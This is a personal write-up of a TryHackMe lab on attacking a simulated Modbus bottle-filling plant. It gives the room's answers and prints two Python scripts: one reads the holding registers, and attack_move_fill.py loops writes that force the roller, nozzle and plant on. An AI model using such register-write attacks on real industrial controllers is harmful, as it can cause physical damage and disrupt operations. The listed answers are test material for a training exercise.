<h1 align="center">Attacking ICS Plant #1</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/5f6218cd-69b3-4aa6-a51f-b1e035c69ec4"><br>
2025, September 10<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>492</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Learn how to discover and attack ICS plants using modbus protocol (Modicon / Schneider Electric).</em>.<br>
Access it <a href="https://tryhackme.com/room/attackingics1"</a>here.<br>
<img width="1200px" src=""></p>


<h2>Task 1 . Introduction</h2>

<p><em>Answer the question below</em></p>

<p>1.1. No answer needed<br>
<code>No answer needed</code></p>

<h2>Task 2 . Introduction to Modbus protocol</h2>
<p>[ Download Task Files ]</p>
<p>Modbus is an industrial protocol developed by Modicon, acquired by Schneider Electric. Modbus is widely used to connect industrial devices; protocol specification is available and royalty-free.<br>

Modbus protocol is a master/slave protocol: the master reads and writes slaves' registers.<br>

Modbus RTU is usually used via RS-485 (serial network): one master is present with one or more slaves. Each slave has an unique 8-bit address.<br>

Modbus data is used to read and write "registers" which are 16-bit long. The most common register is called "holding register" which is readable and writable; registry type "input register" is readable only. The registers "coil" and "discrete input" are 1-bit long: coils are readable and writable, discrete inputs are readable only.<br>

Modbus register types:<br>

- Discrete Input (Status Input): 1bit, RO<br>
- Coil (Discrete Output): 1bit, R/W<br>
- Input Register: 16bit, RO<br>
- Holding Register: 16bit R/W<br>

Most commonly Modbus function:</p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/0b7972f6-fa6b-4866-bd12-ab7e3c1b722b"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>Modbus TCP encapsulates Modbus RTU request and response data packets in a TCP packet transmitted over standard Ethernet networks. The TCP Modbus standard port is 502.<br>

For more information see  <a href="https://www.csimn.com/CSI_pages/Modbus101.html">Modbus 101 - Introduction to Modbus</a>.<br>

Before starting, download the attached script package and install the Modbus TCP library for Python with the following command:<br>

<code>pip3 install pymodbus==1.5.2</code></p>

<p><em>Answer the questions below</em></p>

<p>2.1. Which is the function used to read holding registers in pymodbus library? Hint: <em>See discovery.py</em><br>
<code>read_holding_registers</code></p>

<p>

- https://pymodbus.readthedocs.io/en/latest/source/client.html</p>

<img width="1316" height="290" alt="image" src="https://github.com/user-attachments/assets/cbe0bfca-ea41-43ba-be58-b60f9714afb8" />

<br>
<br>

<img width="1287" height="435" alt="image" src="https://github.com/user-attachments/assets/dc13c86d-e151-4ced-a3ea-477cd9721f52" />

<br>
<br>
<p>2.2. Which is the function used to write holding registers in pymodbus library? Hint: <em>See any attack*.py files.</em><br>
<code>write_register</code></p>

<img width="1315" height="371" alt="image" src="https://github.com/user-attachments/assets/4dfd5dfc-fc42-48f0-a731-af0edd573f3e" />

<br>
<br>

<p>

- Task Files</p>

<img width="243" height="216" alt="image" src="https://github.com/user-attachments/assets/567953b8-2997-4481-8a1c-47a41ee8d87c" />

<br>
<br>
<h2>Task 3 . Discover</h2>
<p>Connect to the plant using the browser (http://MACHINE_IP) and learn how the bottle-filling plant works.<br>

We have three phases:<br>

- <strong>Initialization</strong>: the plant is starting from the beginning. The roller moves the first bottle under the nozzle.<br>
- <strong>Filling</strong>: once a bottle is under the nozzle, the nozzle opens and the water flows in the bottle.<br>
- <strong>Moving</strong>: once the bottle is filled, the roller starts again moving the next empty bottle under the nozzle.<br>

When the phase 3 ends, the plant starts again with phase 2.<br>

From the three phases described above, we can observe:<br>

- <strong>Sensors</strong>: used to read a state of the plant.<br>
- <strong>Actuators</strong>: used to alter the state of the plant.<br>

Example: a sensor can detect if a bottle is under the nozzle, while an actuator can open or close the nozzle.<br>

Mind we can press the ESC button to start the plant from the beginning.<br>

VirtuaPlant can be downloaded from <a href="https://github.com/jseidl/virtuaplant/network/members">GitHub</a>.</p>

<p><em>Answer the question below</em></p>

<p>3.1. How many phases can we observe?<br>
<code>3</code></p>

<p>3.2. How many sensores can we observe?<br>
<code>2</code></p>

<img width="548" height="314" alt="image" src="https://github.com/user-attachments/assets/00f5e8cb-021a-4362-956c-8814d3c5fae3" />

<br>
<br>
<p>3.3. How many actuators can we observe?<br>
<code>3</code></p>

<p>3.4. Using the script discovery.py, how many registers can we count?<br>
<code>16</code></p>

<img width="700" height="112" alt="image" src="https://github.com/user-attachments/assets/0506f01a-40af-42f1-ae34-20b5d82fb0e9" />

<br>
<br>

<img width="1125" height="276" alt="image" src="https://github.com/user-attachments/assets/0c3cadae-631a-4a88-a8fe-8a4c0ddd558d" />

<br>
<br>

<p>3.5. After the plant is started and a bottle is loaded, how many registers are continuously changing their values?<br>
<code>4</code></p>p>

<img width="703" height="599" alt="image" src="https://github.com/user-attachments/assets/8062a052-2198-4eef-a574-348030413e68" />

<br>
<br>

<p>3.6. Which is the minimum observed value?<br>
<code>0</code></p>

<img width="703" height="599" alt="image" src="https://github.com/user-attachments/assets/efe3f8ae-6f1a-4bc0-861e-e9b0a209b716" />

<br>
<br>
<p>3.7. Which is the maximum observed value?<br>
<code>1</code></p>

<p>3.8. Which registry is holding its value?<br>
<code>16</code></p>

<img width="680" height="738" alt="image" src="https://github.com/user-attachments/assets/e1c6c58f-0b99-464f-9880-0b013413a77d" />

<br>
<br>
<p>3.9. Which registries are set to 1 while the nozzle is filling a bottle?<br>
<code>2 4</code></p>

<img width="680" height="738" alt="image" src="https://github.com/user-attachments/assets/5c1c3557-3c5e-4431-8beb-7abaf740101d" />



<p>3.10. Which registries are set to 1 while the roller is moving the bottles?<br>
<code>1 3</code></p>

<img width="681" height="738" alt="image" src="https://github.com/user-attachments/assets/5931e929-ad9a-4fed-96f1-11724ff12a03" />

<br>
<br>
<p>3.11. Which is the color of the water level sensor?<br>
<code>red</code></p>

<img width="506" height="290" alt="image" src="https://github.com/user-attachments/assets/109a5260-25c5-4897-a1ac-9367baae2031" />

<br>
<br>
<p>3.12. Which is the color of the bottle sensor?<br>
<code>green</code></p>

<img width="506" height="290" alt="image" src="https://github.com/user-attachments/assets/5e777f6f-ebcf-4dba-b7f2-e82313b18d19" />

<br>
<br>
<p>3.13. If you observe the plant at the very beginning, which is the registry associated with the roller?<br>
<code>3</code></p>

<p>3.14. Based on the previous answer, which is the registry associated with the water level sensor?<br>
<code>1</code>>/p>


<img width="1268" height="472" alt="image" src="https://github.com/user-attachments/assets/a3fb62ad-ee55-47bb-892e-25bf6ea1a7ec" />


<br>
<br>
<h2>Task 4 . Play to learn</h2>


<p><em>Answer the question below</em></p>

<p>4.1. Which is the registry associated with the nozzle?<br>
<code>4</code></p>



<h1>Task 5 . </h1>

```bash
pip3 install pymodbus==1.5.2
```

<h4><em>attack_move_fill.py</em></h4>

```bash
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
  client.write_register(3, 1)  # Start the roller
  client.write_register(4, 1)  # Open the nozzle
  client.write_register(16, 1) # Start the plant
```

<h4><em>discovery.py</em></h4>

```bash
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
    rr = client.read_holding_registers(1, 16)
    print(rr.registers)
    time.sleep(1)
```





<h1>Complete</h1>




<img width="1895" height="895" alt="image" src="https://github.com/user-attachments/assets/6a41b487-b674-454d-968b-40996344e246" />

<img width="1899" height="903" alt="image" src="https://github.com/user-attachments/assets/457a7185-dbd1-4265-a1aa-64079f39326d" />



<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/4e39c199-886d-465a-b708-6826a4135298" />


<img width="1903" height="893" alt="image" src="https://github.com/user-attachments/assets/79e6f2f7-6003-43e4-b1c1-51267222e33f" />


<img width="1895" height="900" alt="image" src="https://github.com/user-attachments/assets/8f940aa2-7319-4a0b-a5ea-aca61ebbec91" />

<img width="1908" height="902" alt="image" src="https://github.com/user-attachments/assets/ba24d1dc-6ed3-4bcd-b311-ab270180d522" />


<img width="1896" height="893" alt="image" src="https://github.com/user-attachments/assets/ac8ba545-b258-40cf-a368-73a0c4540a7c" />




